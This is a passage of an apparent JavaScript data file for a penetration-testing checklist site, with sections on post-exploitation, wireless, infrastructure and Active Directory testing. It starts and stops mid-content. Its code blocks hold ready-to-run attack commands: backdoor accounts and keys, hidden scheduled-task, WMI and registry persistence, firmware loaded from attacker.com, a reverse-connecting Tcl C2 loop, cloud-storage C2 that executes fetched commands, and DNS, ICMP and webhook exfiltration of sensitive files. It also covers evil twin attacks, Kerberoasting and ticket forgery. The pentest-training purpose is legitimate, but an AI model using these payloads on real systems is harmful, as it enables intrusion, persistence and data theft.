  -d '{"username":"admin", "password":"password", "command":"config system admin user; edit admin; set password NewPassword123; end"}'

# Privilege escalation through network device API
# Exploiting CSRF or missing authentication checks
curl -X POST "https://10.0.0.5/api/firmware/update" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://attacker.com/malicious_firmware.bin"}'</pre>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">Stealth Persistence Methods</h4>
                <p class="technique-description">Advanced techniques to maintain access while minimizing detection risk.</p>
                <pre class="code-block">
# SSH authorized_keys backdoor (Unix/Linux)
mkdir -p ~/.ssh/
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys

# Cisco IOS backdoor user with privilege 15
enable
configure terminal
username backdoor privilege 15 secret Str0ngP@ss!
exit

# Creating hidden scheduled tasks (Windows)
schtasks /create /tn "System\Update" /tr "powershell -e Base64EncodedPayload" /sc daily /st 09:00 /ru "SYSTEM" /f

# Firewall backdoor rules
# For iptables:
iptables -I INPUT -p tcp -s attacker_ip --dport 53 -j ACCEPT
# For Windows Firewall:
netsh advfirewall firewall add rule name="DNS Service" dir=in action=allow protocol=TCP localport=53 remoteip=attacker_ip

# Creating a WMI event subscription persistence
wmic /namespace:"\\\\root\\subscription" path __EventFilter create Name="FilterName", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
wmic /namespace:"\\\\root\\subscription" path CommandLineEventConsumer create Name="ConsumerName", ExecutablePath="C:\\Windows\\System32\\cmd.exe", CommandLineTemplate="/c powershell -e Base64EncodedPayload"
wmic /namespace:"\\\\root\\subscription" path __FilterToConsumerBinding create Filter="__EventFilter.Name=\"FilterName\"", Consumer="CommandLineEventConsumer.Name=\"ConsumerName\""

# Registry run key persistence with WMIC
wmic USERACCOUNT where "Name='Administrator'" get SID
reg add "HKEY_USERS\S-1-5-21-1234567890-1234567890-1234567890-500\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /t REG_SZ /d "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -e Base64EncodedPayload" /f</pre>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">Network-Based Command and Control</h4>
                <p class="technique-description">Establishing covert communication channels through network infrastructure.</p>
                <ul>
                    <li><strong>DNS Tunneling:</strong> Encapsulating C2 traffic within DNS queries and responses</li>
                    <li><strong>ICMP Tunneling:</strong> Using ICMP echo request/reply for command transmission</li>
                    <li><strong>Protocol Abuse:</strong> Hiding C2 traffic in legitimate protocols (HTTP, HTTPS, etc.)</li>
                    <li><strong>Traffic Timing:</strong> Using timing between packets to encode commands</li>
                    <li><strong>Covert Channels:</strong> Embedding data in protocol fields not typically monitored</li>
                    <li><strong>Cloud Services:</strong> Using legitimate cloud services for command and control</li>
                    <li><strong>Network Device Implants:</strong> Embedding C2 channels in network equipment</li>
                </ul>
                <pre class="code-block">
# Setting up DNS tunneling with dnscat2
# On attacker server:
ruby dnscat2.rb domain.com

# On compromised client:
./dnscat2 domain.com

# HTTP(S) tunneling with tunna
python proxy.py -u http://target.com/conn.php -l 8000

# ICMP tunneling with ptunnel
# On attacker:
ptunnel -p target.com -lp 8000 -da internal.server -dp 22
# On local machine:
ssh -p 8000 user@localhost

# Using compromised network device for command and control
# On Cisco IOS (using TCL scripting):
tclsh
puts [open "flash:script.tcl" w+] {
  set timer [after 60000 {
    # Connect back to C2 server
    set s [socket 192.168.1.100 8080]
    gets $s cmd
    set result [exec $cmd]
    puts $s $result
    close $s
    source flash:script.tcl
  }]
}
source flash:script.tcl

# Using cloud storage for command and control
# On compromised system:
while true; do
  curl -s https://storage.googleapis.com/bucket/commands.txt > /tmp/cmds
  bash /tmp/cmds > /tmp/output
  curl -X PUT -d @/tmp/output https://storage.googleapis.com/bucket/output.txt
  sleep 300
done</pre>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">Advanced Data Exfiltration Techniques</h4>
                <p class="technique-description">Methods to covertly extract sensitive data from compromised networks.</p>
                <pre class="code-block">
# DNS-based data exfiltration
for chunk in $(cat sensitive_data.txt | base64 -w 30); do
  dig $chunk.exfil.attacker.com
done

# ICMP exfiltration
xxd -p sensitive_data.txt | tr -d '\n' | fold -w 32 | while read chunk; do
  ping -c 1 -p $chunk 192.168.1.100
done

# Using legitimate web services
curl -X POST -d @sensitive_data.txt https://webhook.site/unique-id

# Steganography-based exfiltration
steghide embed -cf innocent.jpg -ef sensitive_data.txt -p password
curl -F "file=@innocent.jpg" https://example.com/upload.php

# Timed network traffic patterns
# Encoding data in the timing between packets
for byte in $(xxd -p sensitive_data.txt); do
  value=$((0x$byte))
  sleep $(($value / 10))
  ping -c 1 192.168.1.100
done</pre>
            </div>
        </div>
        `,
        toolsHTML: `
        <div class="tools-grid">
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-level-up-alt tool-icon"></i>
                    <h4 class="tool-title">PowerSploit</h4>
                </div>
                <p class="tool-description">PowerShell framework that includes privilege escalation, post-exploitation, and persistence modules.</p>
                <a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-cloud-upload-alt tool-icon"></i>
                    <h4 class="tool-title">Empire</h4>
                </div>
                <p class="tool-description">Post-exploitation framework with an emphasis on stealth and evasion techniques.</p>
                <a href="https://github.com/BC-SECURITY/Empire" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-download tool-icon"></i>
                    <h4 class="tool-title">Mimikatz</h4>
                </div>
                <p class="tool-description">Advanced credential harvesting tool for extracting passwords and hashes from memory.</p>
                <a href="https://github.com/gentilkiwi/mimikatz" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-dungeon tool-icon"></i>
                    <h4 class="tool-title">Covenant</h4>
                </div>
                <p class="tool-description">.NET command and control framework with a web interface for post-exploitation operations.</p>
                <a href="https://github.com/cobbr/Covenant" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-fingerprint tool-icon"></i>
                    <h4 class="tool-title">CrackMapExec</h4>
                </div>
                <p class="tool-description">Swiss army knife for network lateral movement and post-exploitation.</p>
                <a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-reply-all tool-icon"></i>
                    <h4 class="tool-title">Sliver</h4>
                </div>
                <p class="tool-description">Modern cross-platform implant framework for red team operations.</p>
                <a href="https://github.com/BishopFox/sliver" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
        </div>
        `
    },
    'wireless': {
        title: '6. Wireless Network Testing',
        subtitle: 'Assessing security of WiFi, Bluetooth, and other wireless technologies',
        priority: 'high',
        icon: '<i class="fas fa-wifi" style="color: var(--warning);"></i>',
        checklistItems: [
            { groupTitle: '6.1 WiFi Security Testing' },
            { id: '6.1.1', text: 'Discover and map WiFi networks' },
            { id: '6.1.2', text: 'Analyze WiFi security configurations' },
            { id: '6.1.3', text: 'Test security of WEP/WPA/WPA2/WPA3 implementations' },
            { id: '6.1.4', text: 'Perform WPA handshake capture and cracking' },
            { id: '6.1.5', text: 'Test for weak client authentication methods' },
            { id: '6.1.6', text: 'Assess WiFi network segmentation' },
            
            { groupTitle: '6.2 Wireless Attack Techniques' },
            { id: '6.2.1', text: 'Conduct Evil Twin/Rogue AP attacks' },
            { id: '6.2.2', text: 'Perform client deauthentication attacks' },
            { id: '6.2.3', text: 'Test for WPS vulnerabilities' },
            { id: '6.2.4', text: 'Exploit weak captive portal implementations' },
            { id: '6.2.5', text: 'Perform KRACK and similar protocol attacks where applicable' },
            { id: '6.2.6', text: 'Test for Dragonblood and other WPA3 vulnerabilities' },
            
            { groupTitle: '6.3 Other Wireless Technologies' },
            { id: '6.3.1', text: 'Test Bluetooth security configurations' },
            { id: '6.3.2', text: 'Scan for vulnerable IoT devices' },
            { id: '6.3.3', text: 'Assess RFID/NFC systems if in scope' },
            { id: '6.3.4', text: 'Test ZigBee/Z-Wave implementations' },
            { id: '6.3.5', text: 'Evaluate proprietary wireless protocols if present' },
            { id: '6.3.6', text: 'Test Bluetooth Low Energy (BLE) implementations' },
            
            { groupTitle: '6.4 Wireless Infrastructure' },
            { id: '6.4.1', text: 'Assess wireless controller security' },
            { id: '6.4.2', text: 'Test segmentation between wireless and wired networks' },
            { id: '6.4.3', text: 'Evaluate wireless IDS/IPS effectiveness' },
            { id: '6.4.4', text: 'Test guest network isolation' },
            { id: '6.4.5', text: 'Document all findings with signal coverage maps when relevant' },
            { id: '6.4.6', text: 'Evaluate WiFi management system security' }
        ],
        techniquesHTML: `
        <div class="techniques-list">
            <div class="technique-item">
                <h4 class="technique-title">WPA/WPA2/WPA3 Handshake Capture and Cracking</h4>
                <p class="technique-description">Methodical approach to testing WiFi password security.</p>
                <pre class="code-block">
# Put wireless adapter in monitor mode
airmon-ng check kill
airmon-ng start wlan0

# Discover wireless networks
airodump-ng wlan0mon

# Target specific AP and capture handshakes
airodump-ng -c 1 --bssid 00:11:22:33:44:55 -w capture wlan0mon

# In a separate terminal, force handshakes through deauthentication
aireplay-ng -0 1 -a 00:11:22:33:44:55 -c FF:FF:FF:FF:FF:FF wlan0mon

# Crack captured handshake with hashcat
hashcat -m 22000 capture.hccapx wordlist.txt

# For WPA3, use hcxdumptool for capture
hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# Convert and crack with hashcat
hcxpcapngtool -o hash.22000 capture.pcapng
hashcat -m 22000 hash.22000 wordlist.txt

# Testing PMKID-based attacks (no client required)
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1 --filterlist=targets.lst --filtermode=2
hcxpcapngtool -o pmkid.22000 pmkid.pcapng
hashcat -m 22000 pmkid.22000 wordlist.txt -r rules/best64.rule</pre>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">Evil Twin Attack Methodology</h4>
                <p class="technique-description">Creating rogue access points to intercept wireless traffic and credentials.</p>
                <ol>
                    <li><strong>Reconnaissance:</strong> Identify target network SSID, channel, and client devices</li>
                    <li><strong>Infrastructure Setup:</strong> Create identical access point with stronger signal</li>
                    <li><strong>Client Displacement:</strong> Deauthenticate clients from legitimate AP</li>
                    <li><strong>Traffic Capture:</strong> Intercept authentication attempts and network traffic</li>
                    <li><strong>Analysis:</strong> Extract credentials and sensitive information</li>
                    <li><strong>Attack Variants:</strong> Captive portal cloning, encrypted network downgrade</li>
                </ol>
                <pre class="code-block">
# Setting up Evil Twin with airgeddon
./airgeddon.sh
# Then follow the menu options for Evil Twin attack

# Alternative manual setup
# Create AP with hostapd
cat > hostapd.conf << EOF
interface=wlan0
driver=nl80211
ssid=Target_Network
hw_mode=g
channel=6
macaddr_acl=0
ignore_broadcast_ssid=0
EOF

# Start DHCP server with dnsmasq
dnsmasq -C dnsmasq.conf -d

# Redirect traffic through your machine
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080

# Start credential capture server
python3 -m http.server 8080

# Advanced Evil Twin with enterprise WiFi attack
# Create an enterprise mode access point with hostapd-wpe
hostapd-wpe hostapd-wpe.conf
# Will capture and hash enterprise credentials automatically</pre>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">Bluetooth Security Assessment</h4>
                <p class="technique-description">Techniques for testing Bluetooth device security.</p>
                <ul>
                    <li><strong>Discovery and Enumeration:</strong> Identifying visible and non-visible devices</li>
                    <li><strong>Service Enumeration:</strong> Mapping available services and permissions</li>
                    <li><strong>Pairing Security:</strong> Testing for weak PIN/passkey implementations</li>
                    <li><strong>Sniffing:</strong> Capturing and analyzing Bluetooth traffic</li>
                    <li><strong>Spoofing:</strong> Impersonating trusted devices to gain unauthorized access</li>
                    <li><strong>BIAS Attacks:</strong> Testing for Bluetooth Impersonation AttackS vulnerabilities</li>
                    <li><strong>KNOB Attacks:</strong> Testing for Key Negotiation Of Bluetooth weaknesses</li>
                </ul>
                <pre class="code-block">
# Scanning for Bluetooth devices
hcitool scan
btscanner

# Detailed device information
sdptool browse 00:11:22:33:44:55

# Bluetooth sniffing with Ubertooth
ubertooth-btle -f -c bluetooth.pcap

# Testing for Bluetooth Low Energy vulnerabilities
# With gattacker for MITM
gattacker -w capture.json
gattacker-replay -w capture.json

# Cracking Bluetooth pairing
crackle -i bluetooth_capture.pcap -o decrypted.pcap

# BLE sniffing with specific targeting
btlejack -f 37,38,39 -c 5</pre>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">IoT and ZigBee/Z-Wave Assessment</h4>
                <p class="technique-description">Evaluating security of IoT wireless protocols and implementations.</p>
                <pre class="code-block">
# ZigBee security testing with KillerBee
zbstumbler
zbdump -f capture.pcap -c 15
zbreplay capture.pcap

# Z-Wave network assessment
# With OpenZWave
oz-capture -d /dev/ttyUSB0 -f capture.pcap
oz-decode capture.pcap

# Generic SDR-based capture of IoT wireless
rtl_433 -f 433.92M -g 40

# Testing for insecure IoT device registration
echo -e "AT+CWMODE=2\r\n" > /dev/ttyUSB0
echo -e "AT+CWSAP=\"IoT_Test\",\"\",5,0\r\n" > /dev/ttyUSB0

# Analyzing IoT traffic with Wireshark
tshark -i wlan0mon -Y "mqtt" -T fields -e mqtt.topic -e mqtt.msg</pre>
            </div>
        </div>
        `,
        toolsHTML: `
        <div class="tools-grid">
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-satellite-dish tool-icon"></i>
                    <h4 class="tool-title">Aircrack-ng Suite</h4>
                </div>
                <p class="tool-description">Comprehensive suite for WiFi security assessment including packet capture, injection, and cracking.</p>
                <a href="https://www.aircrack-ng.org/" target="_blank" class="tool-link">
                    <span>Website</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-broadcast-tower tool-icon"></i>
                    <h4 class="tool-title">Wifite2</h4>
                </div>
                <p class="tool-description">Automated wireless attack tool designed to simplify WiFi security testing.</p>
                <a href="https://github.com/derv82/wifite2" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-tooth tool-icon"></i>
                    <h4 class="tool-title">Ubertooth</h4>
                </div>
                <p class="tool-description">Open source platform for Bluetooth experimentation and security testing.</p>
                <a href="https://github.com/greatscottgadgets/ubertooth/" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-wifi tool-icon"></i>
                    <h4 class="tool-title">Kismet</h4>
                </div>
                <p class="tool-description">Wireless network detector, sniffer, and IDS that works with WiFi, Bluetooth, and other wireless protocols.</p>
                <a href="https://www.kismetwireless.net/" target="_blank" class="tool-link">
                    <span>Website</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-wave-square tool-icon"></i>
                    <h4 class="tool-title">HackRF</h4>
                </div>
                <p class="tool-description">Software-defined radio peripheral for testing a wide range of wireless protocols from 1MHz to 6GHz.</p>
                <a href="https://greatscottgadgets.com/hackrf/" target="_blank" class="tool-link">
                    <span>Website</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-microchip tool-icon"></i>
                    <h4 class="tool-title">BTLEjack</h4>
                </div>
                <p class="tool-description">Tool for Bluetooth Low Energy sniffing and hijacking, focused on BLE security testing.</p>
                <a href="https://github.com/virtualabs/btlejack" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
        </div>
        `
    },
    'infrastructure': {
        title: '7. Infrastructure Security Assessment',
        subtitle: 'Evaluating security of network infrastructure devices and defensive systems',
        priority: 'critical',
        icon: '<i class="fas fa-server" style="color: var(--danger);"></i>',
        checklistItems: [
            { groupTitle: '7.1 Firewall & Access Control Assessment' },
            { id: '7.1.1', text: 'Test firewall rule effectiveness' },
            { id: '7.1.2', text: 'Identify firewall evasion opportunities' },
            { id: '7.1.3', text: 'Assess NAT configurations' },
            { id: '7.1.4', text: 'Evaluate stateful inspection capabilities' },
            { id: '7.1.5', text: 'Test firewall high availability and failover mechanisms' },
            { id: '7.1.6', text: 'Assess next-generation firewall capabilities' },
            
            { groupTitle: '7.2 IDS/IPS Evaluation' },
            { id: '7.2.1', text: 'Test detection capabilities of IDS/IPS systems' },
            { id: '7.2.2', text: 'Assess alert thresholds and false positive rates' },
            { id: '7.2.3', text: 'Attempt IDS/IPS evasion techniques' },
            { id: '7.2.4', text: 'Evaluate response actions for detected threats' },
            { id: '7.2.5', text: 'Test IDS/IPS signature coverage and effectiveness' },
            { id: '7.2.6', text: 'Assess behavioral analysis and anomaly detection capabilities' },
            
            { groupTitle: '7.3 Network Segmentation' },
            { id: '7.3.1', text: 'Assess VLAN implementation and security' },
            { id: '7.3.2', text: 'Test network isolation between segments' },
            { id: '7.3.3', text: 'Identify network segmentation bypass techniques' },
            { id: '7.3.4', text: 'Evaluate access control between security zones' },
            { id: '7.3.5', text: 'Test for VLAN hopping vulnerabilities' },
            { id: '7.3.6', text: 'Evaluate microsegmentation implementations' },
            
            { groupTitle: '7.4 Network Architecture' },
            { id: '7.4.1', text: 'Review network topology for security weaknesses' },
            { id: '7.4.2', text: 'Assess DMZ implementation and security' },
            { id: '7.4.3', text: 'Evaluate network device redundancy' },
            { id: '7.4.4', text: 'Test network monitoring capabilities' },
            { id: '7.4.5', text: 'Document infrastructure vulnerabilities with practical impact' },
            { id: '7.4.6', text: 'Evaluate zero-trust implementation effectiveness' }
        ],
        techniquesHTML: `
        <div class="techniques-list">
            <div class="technique-item">
                <h4 class="technique-title">Firewall Rule Testing Methodology</h4>
                <p class="technique-description">Comprehensive approach to validating firewall rule effectiveness.</p>
                <ol>
                    <li><strong>Baseline Mapping:</strong> Determine what traffic is normally allowed/blocked</li>
                    <li><strong>Rule Discovery:</strong> Systematically probe to identify specific rule patterns</li>
                    <li><strong>Evasion Testing:</strong> Attempt techniques to bypass identified rules</li>
                    <li><strong>State Testing:</strong> Evaluate how stateful inspection handles established connections</li>
                    <li><strong>Deep Packet Inspection:</strong> Test application layer filtering capabilities</li>
                    <li><strong>Protocol Manipulation:</strong> Test handling of protocol violations and edge cases</li>
                    <li><strong>Performance Testing:</strong> Evaluate behavior under load and during attacks</li>
                </ol>
                <pre class="code-block">
# Basic firewall rule testing with nmap
# TCP connect scan
nmap -sT -p1-65535 target_ip

# SYN scan (requires root)
sudo nmap -sS -p1-65535 target_ip

# SYN scan with fragmentation
sudo nmap -sS -f -p1-65535 target_ip

# Testing with uncommon packet flags
sudo nmap -sX -p1-65535 target_ip  # XMAS scan
sudo nmap -sN -p1-65535 target_ip  # NULL scan
sudo nmap -sF -p1-65535 target_ip  # FIN scan

# Using specific source ports that might be allowed
sudo nmap -sS -p1-65535 --source-port 53 target_ip  # DNS source port
sudo nmap -sS -p1-65535 --source-port 80 target_ip  # HTTP source port

# Advanced firewall testing with hping3
sudo hping3 -S -p 80 -c 5 target_ip  # SYN to port 80
sudo hping3 -SA -p 80 -c 5 target_ip  # SYN+ACK to port 80

# Testing next-generation firewall application identification
# Custom crafted HTTP request with evasion techniques
echo -e "GET / HTTP/1.1\r\nHost: internal.server\r\nX-Forwarded-For: 192.168.1.1\r\nUser-Agent: Mozilla/5.0\r\n\r\n" | nc -v target_ip 80</pre>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">IDS/IPS Evasion Techniques</h4>
                <p class="technique-description">Methods to test evasion resistance of intrusion detection and prevention systems.</p>
                <ul>
                    <li><strong>Fragmentation:</strong> Splitting attack payloads across multiple packets</li>
                    <li><strong>Timing:</strong> Slowing attack execution below detection thresholds</li>
                    <li><strong>Obfuscation:</strong> Encoding attack patterns to avoid signature detection</li>
                    <li><strong>Protocol Abuse:</strong> Manipulating protocol fields in non-standard ways</li>
                    <li><strong>Encryption:</strong> Using encrypted channels to hide attack traffic</li>
                    <li><strong>Polymorphism:</strong> Using variable encodings for the same attack</li>
                    <li><strong>Traffic Manipulation:</strong> Adding noise or chaff to disguise attack pattern</li>
                </ul>
                <pre class="code-block">
# Packet fragmentation with fragroute
echo "fragment:250" > frag.conf
fragroute -f frag.conf target_ip

# Slow scanning with nmap
sudo nmap -sS -T0 -p 22,80,443 target_ip

# Using encryption to evade IDS
# SSH tunneling
ssh -D 9050 user@pivot_host
proxychains nmap -sT -p1-1000 target_internal_ip

# Testing Snort IDS evasion
# Using tool like IDSWakeup
./idswakeup eth0 target_ip MyNetwork
# or Pytbull for comprehensive testing
python pytbull.py -t evasion -m all -d 192.168.1.0/24

# Obfuscating HTTP traffic to evade WAF/NIDS
# Unicode encoding in URLs
curl "http://target_ip/login.php?username=%u0075%u0073%u0065%u0072&password=%u0070%u0061%u0073%u0073"

# Testing HTTP parameter pollution
curl "http://target_ip/search.php?q=normal&q=</\script>alert(1)<\/script>"

# Testing traffic normalization capabilities
scapy
# In Python with Scapy
send(IP(dst="target_ip", flags="MF")/TCP(dport=80, flags="S")/("A"*10))
send(IP(dst="target_ip", frag=1)/("B"*10))</pre>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">VLAN Hopping Attack Methods</h4>
                <p class="technique-description">Techniques to test the security of VLAN implementations.</p>
                <pre class="code-block">
# Double tagging attack with Yersinia
yersinia -G

# Tagging attack with scapy
sudo python3
from scapy.all import *
# Create a double-tagged 802.1q packet
packet = Ether()/Dot1Q(vlan=10)/Dot1Q(vlan=20)/IP(dst="target_ip")/ICMP()
sendp(packet, iface="eth0")

# Switch spoofing using DTP
# First enable DTP mode
yersinia dtp -attack 1

# Testing for native VLAN issues
# Create packet with no VLAN tag to target native VLAN
packet = Ether()/IP(dst="target_ip")/ICMP()
sendp(packet, iface="eth0")

# VLAN enumeration with CDP/LLDP inspection
sudo tcpdump -nn -v -i eth0 -s 1500 -c 1 'ether[20:2] == 0x2000'
sudo tcpdump -nn -v -i eth0 -s 1500 -c 1 '(ether[12:2]=0x88cc)'

# Using Nmap NSE scripts for VLAN discovery
sudo nmap --script broadcast-vlan-discovery</pre>
                <p>Key VLAN security aspects to test:</p>
                <ul>
                    <li>Dynamic Trunking Protocol (DTP) misconfigurations</li>
                    <li>Native VLAN vulnerabilities</li>
                    <li>Trunk port security measures</li>
                    <li>VLAN access control list implementation</li>
                    <li>Private VLAN isolation effectiveness</li>
                    <li>VLAN management interface security</li>
                    <li>Inter-VLAN routing controls</li>
                </ul>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">Zero Trust Architecture Assessment</h4>
                <p class="technique-description">Techniques for evaluating zero trust implementation effectiveness.</p>
                <pre class="code-block">
# Testing identity verification
# Attempt access with valid but unauthorized credentials
curl -X POST https://api.target.com/resource \
  -H "Authorization: Bearer validUserToken"

# Testing device verification
# Spoof device fingerprint attributes
curl -X GET https://api.target.com/resource \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
  -H "X-Device-ID: validDeviceID" \
  -H "Authorization: Bearer validToken"

# Testing least privilege access
# Attempt to access resources beyond assigned scope
for endpoint in $(cat endpoints.txt); do
  curl -X GET "https://api.target.com$endpoint" \
    -H "Authorization: Bearer validToken"
done

# Testing for proper session validation
# Replay captured access token after timeout period
sleep 3600
curl -X GET https://api.target.com/resource \
  -H "Authorization: Bearer capturedToken"

# Testing micro-segmentation escape
# From container/VM with limited access
curl -X GET http://neighboring-service:8080/</pre>
            </div>
        </div>
        `,
        toolsHTML: `
        <div class="tools-grid">
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-shield-alt tool-icon"></i>
                    <h4 class="tool-title">Firewall Analyzer</h4>
                </div>
                <p class="tool-description">Tool for auditing and analyzing firewall rule configurations for security gaps and optimization.</p>
                <a href="https://www.manageengine.com/products/firewall/" target="_blank" class="tool-link">
                    <span>Website</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-eye-slash tool-icon"></i>
                    <h4 class="tool-title">Fragroute</h4>
                </div>
                <p class="tool-description">Network tool for testing fragmentation handling and IDS evasion capabilities.</p>
                <a href="https://github.com/stsi/fragroute-debian" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-random tool-icon"></i>
                    <h4 class="tool-title">Yersinia</h4>
                </div>
                <p class="tool-description">Framework for layer 2 protocol attacks including VLAN hopping, STP manipulation, and more.</p>
                <a href="https://github.com/tomac/yersinia" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-network-wired tool-icon"></i>
                    <h4 class="tool-title">hping3</h4>
                </div>
                <p class="tool-description">Advanced packet crafting tool excellent for firewall rule testing and network probing.</p>
                <a href="https://github.com/antirez/hping" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-sitemap tool-icon"></i>
                    <h4 class="tool-title">Scapy</h4>
                </div>
                <p class="tool-description">Powerful interactive packet manipulation program for crafting custom network packets.</p>
                <a href="https://scapy.net/" target="_blank" class="tool-link">
                    <span>Website</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-filter tool-icon"></i>
                    <h4 class="tool-title">WAFWoof</h4>
                </div>
                <p class="tool-description">Tool for identifying and fingerprinting Web Application Firewall products.</p>
                <a href="https://github.com/EnableSecurity/wafw00f" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
        </div>
        `
    },
    'active-directory': {
        title: '8. Active Directory & Identity Testing',
        subtitle: 'Assessing security of directory services and authentication mechanisms',
        priority: 'critical',
        icon: '<i class="fas fa-users-cog" style="color: var(--danger);"></i>',
        checklistItems: [
            { groupTitle: '8.1 Domain Enumeration' },
            { id: '8.1.1', text: 'Enumerate domain structure and trusts' },
            { id: '8.1.2', text: 'Identify domain controllers and FSMO role holders' },
            { id: '8.1.3', text: 'Map organizational units and groups' },
            { id: '8.1.4', text: 'Discover domain users and account policies' },
            { id: '8.1.5', text: 'Enumerate domain computers and servers' },
            { id: '8.1.6', text: 'Discover service accounts and SPN configurations' },
            
            { groupTitle: '8.2 Authentication Attacks' },
            { id: '8.2.1', text: 'Test for Kerberos weaknesses (Kerberoasting, AS-REP Roasting)' },
            { id: '8.2.2', text: 'Attempt NTLM relay attacks' },
            { id: '8.2.3', text: 'Perform password spraying against domain accounts' },
            { id: '8.2.4', text: 'Test for LLMNR/NBT-NS poisoning opportunities' },
            { id: '8.2.5', text: 'Evaluate pass-the-hash/pass-the-ticket attack vectors' },
            { id: '8.2.6', text: 'Test for PetitPotam and other NTLM coercion vulnerabilities' },
            
            { groupTitle: '8.3 Privilege and Access Analysis' },
            { id: '8.3.1', text: 'Analyze group policy objects for security weaknesses' },
            { id: '8.3.2', text: 'Identify excessive privileges and permission issues' },
            { id: '8.3.3', text: 'Test for ACL misconfigurations' },
            { id: '8.3.4', text: 'Evaluate delegation settings for security issues' },
            { id: '8.3.5', text: 'Check for AdminSDHolder and SDProp misconfigurations' },
            { id: '8.3.6', text: 'Assess Active Directory Certificate Services (AD CS) security' },
            
            { groupTitle: '8.4 Domain Trust Exploitation' },
            { id: '8.4.1', text: 'Map domain trust relationships' },
            { id: '8.4.2', text: 'Test for trust relationship vulnerabilities' },
            { id: '8.4.3', text: 'Attempt forest transitive trust exploitation' },
            { id: '8.4.4', text: 'Evaluate external trust security' },
            { id: '8.4.5', text: 'Document impacts and attack paths' },
            { id: '8.4.6', text: 'Test resource-based constrained delegation abuse' }
        ],
        techniquesHTML: `
        <div class="techniques-list">
            <div class="technique-item">
                <h4 class="technique-title">Kerberos Attack Techniques</h4>
                <p class="technique-description">Methods to exploit weaknesses in Kerberos authentication.</p>
                <pre class="code-block">
# Kerberoasting attack with Impacket GetUserSPNs
GetUserSPNs.py -request -dc-ip dc_ip domain.local/user:password
# Then crack with hashcat
hashcat -m 13100 spns.txt wordlist.txt -r rules/best64.rule

# AS-REP Roasting with Impacket GetNPUsers
GetNPUsers.py -dc-ip dc_ip domain.local/ -usersfile users.txt -format hashcat
# Then crack with hashcat
hashcat -m 18200 asrep.txt wordlist.txt -r rules/best64.rule 

# Silver Ticket attack with mimikatz
kerberos::golden /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:service /rc4:NTLM_hash /user:Administrator /ptt

# Golden Ticket attack with mimikatz
